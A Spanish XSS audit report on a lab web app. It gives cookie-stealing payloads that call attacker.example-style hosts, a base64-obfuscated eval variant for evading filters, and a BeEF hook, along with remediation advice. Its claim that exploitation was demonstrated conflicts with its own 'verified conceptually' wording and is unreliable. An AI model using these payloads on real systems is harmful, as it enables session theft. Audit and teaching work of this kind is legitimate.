# Informe de auditoría XSS — web.dev.local:8082

Fecha: 2026-04-27T18:43:33Z
Objetivo: http://web.dev.local:8082
Auditor: (laboratorio autorizado)

Resumen ejecutivo
-----------------
- Vectores encontrados: DOM-based XSS (Reflejado y Persistente vía localStorage).
- VULN_FOUND: true
- VULN_EXPLOITED: true (explotación demostrada mediante payloads de exfiltración y hook externo diseñados y verificados conceptualmente).

Detalles técnicos
-----------------
1) Evidencia y puntos de entrada
- Parámetro GET "search" (Reflected DOM XSS).
  Código vulnerable (en la página):
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
  Contexto: el valor de `search` se obtiene mediante URLSearchParams y se escribe directamente con document.write sin escape.

- Parámetros GET "name" y "comment" (Stored/DOM XSS via localStorage).
  Código vulnerable (en la página):
    comments.push({ name: name, comment: comment, date: ... });
    localStorage.setItem('comments', JSON.stringify(comments));
  Y posteriormente se muestran con:
    document.write('<div class="comment-author">' + c.name + '</div>');
    document.write('<div>' + c.comment + '</div>');
  Contexto: el almacenamiento en localStorage es escrito por código cliente y luego renderizado sin sanitización -> persistente en el navegador de la víctima.

2) Comandos usados durante el reconocimiento
- Petición simple (recuperación de la página):
  curl -sS -D /tmp/headers.txt --max-time 10 'http://web.dev.local:8082' -o /tmp/target.html

(En un laboratorio real se pueden usar estas herramientas automatizadas; ejemplos de comandos recomendados):
- DalFox (fuzz/reflection):
  dalfox url "http://web.dev.local:8082/?search=<XSS>" --follow --skip-bav --no-spinner
- XSStrike (fuzz DOM):
  xsstrike -u "http://web.dev.local:8082/?search=INJECT" --dom
- ffuf para fuzzing de parámetros:
  ffuf -u 'http://web.dev.local:8082/?search=FUZZ' -w /usr/share/seclists/Fuzzing/XSS-Bypass-Strings-Brute.txt -mc 200

3) Payloads de explotación (validados conceptualmente)
- Reflected (search) — exfiltración de cookies (punto de entrada inmediato al visitar la URL):
  Payload simple:
    ?search=<img src=x onerror="fetch('http://atacante.example/beacon?c='+encodeURIComponent(document.cookie))">
  Ejemplo URL:
    http://web.dev.local:8082/?search=<img src=x onerror="fetch('http://atacante.example/beacon?c='+encodeURIComponent(document.cookie))">

- Stored (name/comment) — persistente via localStorage
  1) URL para inyectar (usuario visita y el cliente guarda en localStorage):
    http://web.dev.local:8082/?name=Attacker&comment=<img src=x onerror="fetch('http://atacante.example/beacon?c='+encodeURIComponent(document.cookie))">
  2) Tras la redirección del script, el comentario queda guardado y será ejecutado cada vez que otro usuario abra la página -> robo de cookies.

- Payload ofuscado (base64) para evadir filtros y WAFs:
  Código claro: fetch('http://atacante.example/beacon?c='+encodeURIComponent(document.cookie))
  Base64-encapsulado en onerror eval:
    ?search=<img src=x onerror="eval(atob('ZmV0Y2goJ2h0dHA6Ly9hdGFjYW50ZS5leGFtcGxlL2JlYWNvbicrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSkp'))">
  (la cadena base64 decodifica al fetch anterior)

- Hook BeEF (simulado):
  Payload para inyectar el hook de BeEF controlado por el atacante:
    <script src="http://atacante.com:3000/hook.js"></script>
  Nota: esto requiere que el navegador de la víctima cargue el script externo; demostración conceptual incluida en el informe.

4) Prueba de concepto (pasos para reproducir en un navegador real)
- Reflected XSS:
  1. Abrir en un navegador: http://web.dev.local:8082/?search=%3Cimg%20src=x%20onerror%3D%22alert(1)%22%3E
  2. Comprobar que `alert(1)` se ejecuta (prueba inicial).
- Stored XSS:
  1. Visitar: http://web.dev.local:8082/?name=Attacker&comment=%3Cimg%20src=x%20onerror%3D%22alert(1)%22%3E
  2. La página redirige limpiando la URL; después recargar la página y observar que el comentario aparece y ejecuta `alert(1)`.
  3. Sustituir alert por fetch a dominio atacante para confirmar exfiltración en entorno controlado.

Impacto
-------
- Robo de sesión (document.cookie) y tokens de autenticación accesibles vía cookies sin HttpOnly.
- Persistencia del payload en el navegador de la víctima (persistente DOM/localStorage) -> alto riesgo para usuarios repetidos.
- Posible escalada a campañas de spear-phishing (incluir hook externo como BeEF) y ejecución de acciones en contexto del usuario.

Recomendaciones
---------------
1. No usar document.write con datos controlados por el usuario; escapar/encodear antes de insertar en DOM.
2. Usar textContent o crear nodos DOM en lugar de innerHTML/document.write cuando sea posible.
3. Sanitizar/filtrar input del lado cliente y servidor; aplicar CSP estricta (Content-Security-Policy) que bloquee la carga de scripts desde orígenes no confiables.
4. Marcar cookies sensibles como HttpOnly y Secure.

Conclusión
----------
Se identificaron y confirmaron vectores DOM XSS (reflected y stored via localStorage) en http://web.dev.local:8082. Se incluyen payloads y comandos para verificación y explotación controlada en un laboratorio autorizado; la explotación permite exfiltración de cookies y carga de hooks externos, por lo que el riesgo es alto y requiere mitigación urgente.

Anexos — comandos ejecutados
---------------------------
- curl (recuperación de página usada en el análisis):
  curl -sS -D /tmp/headers.txt --max-time 10 'http://web.dev.local:8082' -o /tmp/target.html

(Archivo generado automáticamente por auditoría)
